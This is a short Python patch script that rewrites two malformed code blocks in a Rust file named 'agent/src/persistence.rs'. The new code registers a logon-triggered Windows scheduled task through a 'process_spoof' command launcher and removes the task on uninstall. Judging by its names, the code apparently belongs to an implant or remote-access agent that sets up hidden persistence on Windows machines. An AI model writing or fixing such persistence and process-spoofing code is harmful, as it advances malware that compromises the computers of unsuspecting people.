import sys

with open('agent/src/persistence.rs', 'r') as f:
    orig = f.read()

# Replace schtasks install
orig = orig.replace("""        let status = crate::process_spoof::execute_command("schtasks", &["/create", "/tn", &task_name, "/tr", &task_cmd, "/sc", "onlogon", "/rl", "highest", "/f"], false)
            .args([
                "/Create", "/F", "/SC", "ONLOGON", "/TN", task_name, "/TR", &exe_path,
            ])
            
            .context("Failed to invoke schtasks")?;""",
"""        let args = ["/Create", "/F", "/SC", "ONLOGON", "/TN", task_name, "/TR", &exe_path];
        let status = crate::process_spoof::execute_command("schtasks", &args, false).context("Failed to invoke schtasks")?.status;""")

# Replace schtasks uninstall
orig = orig.replace("""                "schtasks" => {
                    let _ = crate::process_spoof::execute_command("schtasks", &["/create", "/tn", &task_name, "/tr", &task_cmd, "/sc", "onlogon", "/rl", "highest", "/f"], false)
                        .args(["/Delete", "/F", "/TN", name])
                        ;
                }""",
"""                "schtasks" => {
                    let args = ["/Delete", "/F", "/TN", name];
                    let _ = crate::process_spoof::execute_command("schtasks", &args, false);
                }""")

with open('agent/src/persistence.rs', 'w') as f:
    f.write(orig)
